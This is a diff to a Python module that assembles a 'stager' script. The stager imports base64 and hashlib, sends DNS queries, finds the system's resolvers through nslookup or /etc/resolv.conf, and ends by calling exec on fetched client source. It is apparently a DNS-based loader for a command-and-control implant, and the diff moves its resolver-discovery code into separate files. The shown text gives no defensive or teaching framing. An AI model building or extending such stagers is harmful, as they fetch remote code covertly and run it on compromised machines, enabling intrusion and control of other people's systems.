@@ -30,7 +30,7 @@ def _read_resolver_source(filename):
     return content[idx + len(sentinel):]
 
 
-_STAGER_PREFIX = '''#!/usr/bin/env python
+_STAGER_PRE_RESOLVER = '''#!/usr/bin/env python
 # -*- coding: ascii -*-
 import base64
 import hashlib
@@ -301,90 +301,6 @@ def _send_query(addr, pkt):
             pass
     return resp
 
-
-_IPV4_RE = re.compile(r"(\\d{1,3}(?:\\.\\d{1,3}){3})")
-
-
-def _run_nslookup():
-    args = ["nslookup", "google.com"]
-    run_fn = getattr(subprocess, "run", None)
-    if run_fn is not None:
-        result = run_fn(
-            args,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            timeout=5,
-            universal_newlines=True,
-        )
-        return result.stdout or ""
-    proc = subprocess.Popen(
-        args,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        universal_newlines=True,
-    )
-    output, _ = proc.communicate()
-    return output or ""
-
-
-def _parse_nslookup_output(output):
-    lines = output.splitlines()
-    server_index = None
-    for index, line in enumerate(lines):
-        if line.strip().lower().startswith("server:"):
-            server_index = index
-            break
-    if server_index is None:
-        return None
-    for line in lines[server_index + 1:]:
-        stripped = line.strip()
-        if not stripped:
-            continue
-        if stripped.lower().startswith("non-authoritative answer"):
-            break
-        match = _IPV4_RE.search(stripped)
-        if match:
-            return match.group(1)
-    return None
-
-
-def _load_windows_resolvers():
-    try:
-        output = _run_nslookup()
-    except Exception:
-        return []
-    ip = _parse_nslookup_output(output)
-    if not ip:
-        return []
-    return [ip]
-
-
-def _load_unix_resolvers():
-    resolvers = []
-    try:
-        with open("/etc/resolv.conf", "r") as handle:
-            for raw_line in handle:
-                line = raw_line.strip()
-                if not line or line.startswith("#"):
-                    continue
-                if "#" in line:
-                    line = line.split("#", 1)[0].strip()
-                    if not line:
-                        continue
-                parts = line.split()
-                if len(parts) < 2:
-                    continue
-                if parts[0].lower() != "nameserver":
-                    continue
-                host = parts[1].strip()
-                if not host:
-                    continue
-                if host not in resolvers:
-                    resolvers.append(host)
-    except Exception:
-        return []
-    return resolvers
-
 '''
 
 
@@ -489,4 +405,6 @@ exec(client_source)
 
 
 def build_stager_template():
-    return _STAGER_PREFIX + _STAGER_DISCOVER + _STAGER_SUFFIX
+    windows_resolver = _read_resolver_source("resolver_windows.py")
+    linux_resolver = _read_resolver_source("resolver_linux.py")
+    return _STAGER_PRE_RESOLVER + windows_resolver + linux_resolver + _STAGER_DISCOVER + _STAGER_SUFFIX
